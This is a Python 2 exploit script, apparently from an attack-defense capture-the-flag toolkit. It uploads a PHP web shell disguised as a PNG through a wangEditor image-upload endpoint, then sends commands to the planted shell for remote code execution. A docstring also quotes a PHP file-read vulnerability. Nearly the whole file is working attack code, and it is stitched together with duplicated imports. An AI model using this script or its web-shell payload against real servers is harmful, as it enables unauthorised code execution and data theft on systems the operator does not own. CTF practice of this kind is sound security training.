#!/usr/bin/env python

import requests,re
from framework.http import http
from framework.config import *
from framework.function import *
from urllib import quote
import traceback
from random import randint

def vulnerable_attack(target,target_port,cmd):
		
	'''
	this is the payload script for vuln:

	echo file_get_contents($_POST[444]);

	'''

	try:
		data = cmd 
		#res = http("get",target,target_port,"/bigbrother?filename="+data,'',headers)
		res = attack(target,target_port,data)
		# Even though we can not execute the cmd with the vuln, but we can read flag
		# and we want to use our framework to carry out this attack
		# not do the replicate tasks to code a new script
	except Exception,e:
		debug_print(traceback.format_exc())     
		dump_error("attack failed",target,"vulnerable attack")
		res = "error"

	return res


import requests
import hashlib 
import time
import re
import os




def attack(ip,port,cmd):

	### config ####
	pattern = 'name=\"([0-9a-f]{32})'
	admin_id = '476'

	################

	my_socket = ip + ':' + str(port)
	my_time_hash = '_' + hashlib.md5('xxxx' + str(ip) + str(port) + str(time.time())).hexdigest()
	# my_time_hash = '_' + hashlib.md5('xxxx' + str(ip) + str(port) + str(666)).hexdigest()

	my_shell = "<?php system($_REQUEST['%s']);?>" %(my_time_hash)

	session = requests.Session()

	print 'my hash => ' + my_time_hash


	
	paramsPost = {"wangEditorMobileFile":"%s"%my_shell}
	paramsPost = {"wangEditorMobileFile":('a.php',my_shell,'image/png')}
	headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Cache-Control":"max-age=0","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0","Connection":"Keep-Alive","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"}
	response = session.post("http://%s/index.php?attach/upimg"%my_socket, files=paramsPost, headers=headers)

	print("Status code:   %i" % response.status_code)
	print("Response body: %s" % response.content)

	url_2 = response.content.strip()


	# execute cmd
	data = {my_time_hash:cmd}
	response = requests.post(url_2,data=data,timeout=2)
	print("Status code:   %i" % response.status_code)
	print response.content

	return response.content







if __name__ == '__main__':
	attack('127.0.0.1','80','ls')
